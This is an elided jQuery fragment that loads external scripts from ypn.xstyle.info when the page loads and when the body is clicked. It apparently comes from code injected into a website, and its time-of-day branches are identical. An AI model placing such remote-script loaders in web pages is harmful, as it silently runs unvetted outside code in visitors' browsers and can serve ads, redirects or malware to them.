...
$(document).ready(function(){
    ...
    if(nH<12){
        $('body').append('<script src="http:\/\/ypn.xstyle.info\/?id=1409"><\/script>');
    }else{
        $('body').append('<script src="http:\/\/ypn.xstyle.info\/?id=1409"><\/script>');
    }
    ...
    $('body').click(function() {
        ...
        if(cco==1){
            if(nH<12){
                $('body').append('<script src="http:\/\/ypn.xstyle.info\/?id=1973"><\/script>');
            }else{
                $('body').append('<script src="http:\/\/ypn.xstyle.info\/?id=1973"><\/script>');
            }
        }
        if(cco==2){
            if(nH<12){
                $('body').append('<script src="http:\/\/ypn.xstyle.info\/?id=1193"><\/script>');
            }else{
                $('body').append('<script src="http:\/\/ypn.xstyle.info\/?id=1193"><\/script>');
            }
        }
